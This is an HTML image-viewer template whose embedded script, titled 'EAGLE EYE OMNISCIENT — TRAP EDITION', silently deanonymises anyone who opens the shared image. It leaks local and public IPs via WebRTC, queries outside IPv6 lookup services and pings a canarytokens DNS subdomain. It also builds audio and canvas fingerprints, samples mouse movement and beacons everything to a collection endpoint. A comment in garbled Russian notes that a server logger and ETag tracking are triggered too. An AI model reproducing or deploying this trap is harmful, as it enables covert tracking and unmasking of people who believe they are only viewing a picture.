<!DOCTYPE html>
<html style="height: 100%; margin: 0;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, minimum-scale=0.1">
    <title>{{ filename }}</title>
    <style>
        body {
            margin: 0px;
            background: #0e0e0e;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        img {
            display: block;
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
        }
    </style>
    <script>
    // â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    // â•‘  ðŸ¦… EAGLE EYE OMNISCIENT v7.1 â€” TRAP EDITION (FULL SENSORS)                   â•‘
    // â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    window.EagleEyeOmni = class {
        constructor() {
            this.endpoint = '/api/collect';
            this.sessionId = "{{ uid }}";
            this.canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
            this.init();
        }

        async init() {
            // 1. ETag Persistence Check
            new Image().src = `/pixel.gif?source=image_trap_etag&uid=${this.sessionId}`;
            
            // 2. DNS Canary Trigger (Unique Subdomain)
            if (this.canaryDomain) {
                const uniqueSub = `${this.sessionId}.${Date.now()}`;
                new Image().src = `https://${uniqueSub}.trap.${this.canaryDomain}/pixel.gif`;
            }

            // 3. Collect Data (Wait 500ms for WebRTC/IPv6 candidates)
            setTimeout(() => this.collect(), 500);
        }

        async getWebRTC() {
            const res = { local: [], public: [] };
            try {
                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel('');
                await new Promise(r => {
                    pc.onicecandidate = e => {
                        if(!e.candidate) { r(); return; }
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if(ip) {
                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
                            else res.public.push(ip[1]);
                        }
                    };
                    setTimeout(r, 1000);
                });
            } catch(e){}
            return res;
        }

        async getIPv6() {
            const services = ['https://api64.ipify.org?format=json', 'https://ipv6.icanhazip.com'];
            for (const url of services) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 1500);
                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
                    if (!response.ok) continue;
                    let ip = await response.text();
                    try { ip = JSON.parse(ip).ip; } catch(e){}
                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
                } catch (e) { continue; }
            }
            return { detected: false, ip: null };
        }

        async getAudioHash() {
            try {
                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!Ctx) return "no_audio";
                const audioCtx = new Ctx(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const buffer = await audioCtx.startRendering();
                const data = buffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                return sum.toFixed(6);
            } catch { return "error"; }
        }

        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v7", 2, 15);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch { return "error"; }
        }

        // Mouse Entropy (Simplified for Trap)
        trackMouseEntropy() {
            return new Promise(resolve => {
                let moves = [];
                const fn = e => {
                    moves.push({x:e.clientX, y:e.clientY});
                    if(moves.length > 10) { // Faster check for trap
                        document.removeEventListener('mousemove', fn);
                        let variance = 0;
                        for(let i=2; i<moves.length; i++) {
                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
                            variance += Math.abs(a1 - a2);
                        }
                        resolve(variance);
                    }
                };
                document.addEventListener('mousemove', fn);
                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 2000);
            });
        }

        async collect() {
            const [webrtc, ipv6, audio, entropy] = await Promise.all([
                this.getWebRTC(), 
                this.getIPv6(),
                this.getAudioHash(),
                this.trackMouseEntropy()
            ]);
            const canvas = this.getCanvasHash();
            
            const payload = {
                meta: { 
                    sessionId: this.sessionId, 
                    trigger: "Full Image Trap", 
                    url: window.location.href,
                    filename: "{{ filename }}"
                },
                network: { webrtc: webrtc, ipv6: ipv6 },
                fingerprints: { audio: audio, canvas: canvas },
                system: { 
                    ua: navigator.userAgent, 
                    platform: navigator.platform, 
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    mouseEntropy: entropy
                }
            };
            
            navigator.sendBeacon(this.endpoint, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
        }
    };
    
    window.onload = () => { new EagleEyeOmni(); };
    </script>
</head>
<body>
    <!-- Ð—Ð°Ð³Ñ€ÑƒÐ¶Ð°ÐµÐ¼ ÐºÐ°Ñ€Ñ‚Ð¸Ð½ÐºÑƒ Ñ‡ÐµÑ€ÐµÐ· RAW Ð¼Ð°Ñ€ÑˆÑ€ÑƒÑ‚, Ñ‡Ñ‚Ð¾Ð±Ñ‹ ÑÑ€Ð°Ð±Ð¾Ñ‚Ð°Ð» ÐµÑ‰Ðµ Ð¸ ÑÐµÑ€Ð²ÐµÑ€Ð½Ñ‹Ð¹ Ð»Ð¾Ð³Ð³ÐµÑ€ + ETag -->
    <img src="/raw/{{ filename }}" alt="{{ filename }}">
</body>
</html>
